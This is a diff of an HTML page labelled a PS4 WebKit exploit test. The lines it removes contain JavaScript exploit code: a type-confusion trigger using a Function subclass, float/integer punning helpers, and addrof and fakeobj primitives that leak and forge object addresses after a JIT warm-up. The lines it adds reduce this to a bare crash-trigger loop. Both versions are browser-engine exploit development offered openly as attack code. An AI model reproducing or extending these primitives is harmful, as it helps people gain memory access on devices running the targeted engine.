@@ -1,79 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>PS4 WebKit Exploit Test</title>
-</head>
 <body>
 <script>
-// === PS4 WebKit exploit: Type confusion primitive using MyFunction PoC ===
-
-// 1. Exploit class from your PoC
 class MyFunction extends Function {
     constructor() {
         super();
-        super.prototype = 1;
+        super.prototype = 1; // destabilizes internal type
     }
 }
 
-// 2. Trigger confusion after invalid prototype overwrite
-function confuse(arr, f) {
-    try {
-        f.__defineGetter__("prototype", () => {});
-    } catch (e) {}
-    arr[0] = f.prototype;
-    return arr[0];
-}
-
-// 3. Float/object arrays
-const float_arr = [1.1, 2.2, 3.3];
-const obj_arr   = [{}, {}, {}];
-
-// 4. Type punning (float/int conversions)
-const buf = new ArrayBuffer(16);
-const f64 = new Float64Array(buf);
-const u32 = new Uint32Array(buf);
-
-function f2i(f) {
-    f64[0] = f;
-    return u32[0] + u32[1] * 0x100000000;
-}
-function i2f(i) {
-    u32[0] = i >>> 0;
-    u32[1] = (i / 0x100000000) >>> 0;
-    return f64[0];
-}
-
-// 5. Leak address of a JS object
-function addrof(obj) {
-    obj_arr[0] = obj;
-    let leak = confuse(float_arr, new MyFunction());
-    return f2i(leak);
-}
-
-// 6. Create fake JS object at controlled address
-function fakeobj(addr) {
-    float_arr[0] = i2f(addr);
-    return confuse(obj_arr, new MyFunction());
-}
-
-// 7. Warm up JIT with float-only access pattern
-for (let i = 0; i < 10000; i++) {
-    confuse(float_arr, new MyFunction());
-}
-
-// 8. Run exploit logic
-setTimeout(() => {
-    try {
-        let obj = { marker: 0x41424344 };
-        let addr = addrof(obj);
-        alert("[+] Leaked object address: 0x" + addr.toString(16));
-
-        let fake = fakeobj(addr);
-        alert("[+] fake.marker = 0x" + fake.marker.toString(16));
-    } catch (e) {
-        alert("[-] Exploit failed: " + e);
+function trigger() {
+    for (let i = 0; i < 1000; i++) {
+        const f = new MyFunction();
+        try {
+            f.__defineGetter__("prototype", () => {}); // throws
+        } catch (e) {}
+        try {
+            f.prototype = {x: 1}; // keep it clean
+        } catch (e) {}
     }
-}, 100);
+
+    alert("no crash yet");
+}
+
+trigger();
 </script>
 </body>
 </html>
